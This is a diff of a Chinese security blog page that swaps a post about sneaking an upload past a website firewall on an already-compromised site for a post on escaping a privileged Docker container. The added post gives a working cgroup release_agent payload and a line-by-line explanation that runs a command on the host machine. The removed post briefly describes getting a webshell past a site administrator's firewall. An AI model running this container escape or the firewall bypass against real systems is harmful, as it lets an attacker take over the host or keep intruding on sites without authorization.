@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>绕过网站防火墙上传 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="绕过网站防火墙上传 | 九世的博客">
+  <title>利用cgroup快速逃逸docker | 九世的博客</title>
+  <meta name="keywords" content=" bypass ">
+  <meta name="description" content="利用cgroup快速逃逸docker | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1603,9 +1603,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-绕过网站防火墙上传" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-利用cgroup快速逃逸docker" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">绕过网站防火墙上传</h1>
+        <h1 class="article-title">利用cgroup快速逃逸docker</h1>
     
     <div class="article-meta">
         
@@ -1614,14 +1614,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color2">bypass</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-06 07:59</time>
+        创建时间:<time class="date" title="更新时间: 2021-01-29 02:44:50">2021-01-29 02:40</time>
         
     </div>
     <div class="article-meta">
@@ -1643,7 +1643,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1658,11 +1658,33 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前几天在搞站的时候，拿到了一个webshell。一开始还没有网站防火墙之类的东西，好像是一句话被管理员发现了。安了防火墙和360…360是恶心的一批的东西。</p>
-<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>其实方法很简单，注意看图，这是一开始普通上传没有做任何修改的<br>会被直接拦截<br><img src="https://i.imgur.com/L8tVoiA.png" alt=""></p>
-<p>把图中所画的空格去掉，就能产生BUG导致上传成功。<br><img src="https://i.imgur.com/vpOPLpA.png" alt=""></p>
-<p>上传成功<br><img src="https://i.imgur.com/tqNBsFZ.png" alt=""></p>
-<p><img src="https://i.imgur.com/7pJXcKj.png" alt=""></p>
+        <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1461215205&auto=1&height=66"></iframe></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在群里看见篇docker逃逸的文章，看到个没见到的操作。复现并记录一波</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>容器拥有特权模式<br>docker run -it –privileged ubuntu /bin/bash</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>payload</p>
+<pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
+t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
+touch /o; echo $t/c &gt;$d/release_agent;printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c;
+chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
+</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3OM9.png" alt=""></p>
+<p>命令刨析</p>
+<pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` #寻找cgroup文件夹位置
+mkdir -p $d/w
+echo 1 &gt;$d/w/notify_on_release #该文件的内容为1时，当cgroup退出时（不再包含任何进程和子cgroup），将调用release_agent里面配置的命令。新cgroup被创建时将默认继承父cgroup的这项配置。
+t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` #从当前的分区挂载寻找该容器的UID
+touch /o
+echo $t/c &gt; $d/release_agent #里面包含了cgroup退出时将会执行的命令，系统调用该命令时会将相应cgroup的相对路径当作参数传进去。
+printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c; #输出&lt;command&gt; \&gt; 和容器pid路径 图二 (将在母机上执行的命令执行到容器根目录里面的o文件)
+chmod +x /c
+sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot; #当前cgroup中的所有进程ID，系统不保证ID是顺序排列的，且ID有可能重复 （将进程PID写入除非cgroup执行）
+sleep 1
+cat /o
+</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3jq1.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/01/29/yC3xVx.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/01/29/yC3za6.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当docker容器使用特权模式启动时，有权操控cgroup，由于cgroup是Linux内核的一个功能。利用cgroup可以直接执行母机的命令 （说法可能有误）</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/" target="_blank" rel="noopener">https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F" target="_blank" rel="noopener">https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F</a><br><a href="https://zh.wikipedia.org/wiki/Cgroups" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cgroups</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1672,12 +1694,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>绕过网站防火墙上传</p>
+    <p><span class="copy-title">文章标题:</span>利用cgroup快速逃逸docker</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-06, 07:59:08</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c2257cfb.html" title="绕过网站防火墙上传">http://422926799.github.io/posts/c2257cfb.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-01-29, 02:40:23</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-29, 02:44:50</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/99258750.html" title="利用cgroup快速逃逸docker">http://422926799.github.io/posts/99258750.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
